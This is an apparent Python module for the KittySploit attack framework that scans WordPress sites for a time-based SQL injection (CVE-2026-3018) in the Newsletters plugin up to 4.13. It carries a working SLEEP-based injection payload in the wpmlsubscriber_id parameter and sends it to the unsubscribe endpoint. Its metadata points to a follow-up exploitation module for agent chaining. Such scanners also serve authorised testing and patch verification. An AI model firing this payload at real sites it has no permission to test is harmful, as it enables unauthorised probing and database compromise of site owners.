#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Newsletters <= 4.13 wpmlsubscriber_id SQLi (CVE-2026-3018)."""

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "newsletters-lite"
_VULN_HIGH = (4, 13)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Newsletters CVE-2026-3018 SQLi detect",
        "description": "Time-based SQLi on newsletter-management unsubscribe wpmlsubscriber_id.",
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-3018",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-3018"],
        "modules": ["auxiliary/admin/http/newsletters_cve_2026_3018_sqli"],
        "tags": ["web", "scanner", "wordpress", "newsletters", "sqli", "cve-2026-3018"],
        "agent": {
            "approval_required": True,
            "chain": {"suggested_followups": ["auxiliary/admin/http/newsletters_cve_2026_3018_sqli"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    sleep_seconds = OptInteger(6, "SLEEP duration", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        sleep_s = int(self.sleep_seconds or 6)
        inj = f"1'+AND+(SELECT+6881+FROM+(SELECT(SLEEP({sleep_s})))iEAn)+AND+'1'='1"
        start = time.monotonic()
        resp = self.http_request(
            method="GET",
            path=self._join("/newsletter-management/"),
            params={
                "method": "unsubscribe",
                "wpmlsubscriber_id": inj,
                "authkey": "x",
                "wpmlmailinglist_id": "1",
            },
            allow_redirects=True,
            timeout=25,
        )
        elapsed = time.monotonic() - start
        body = resp.text or "" if resp else ""
        if elapsed >= sleep_s - 1 and resp and int(resp.status_code or 0) == 200:
            self.set_info(
                severity="high",
                reason="Newsletters wpmlsubscriber_id time-based SQLi",
                path="/newsletter-management/",
                cve="CVE-2026-3018",
            )
            return True
        return False
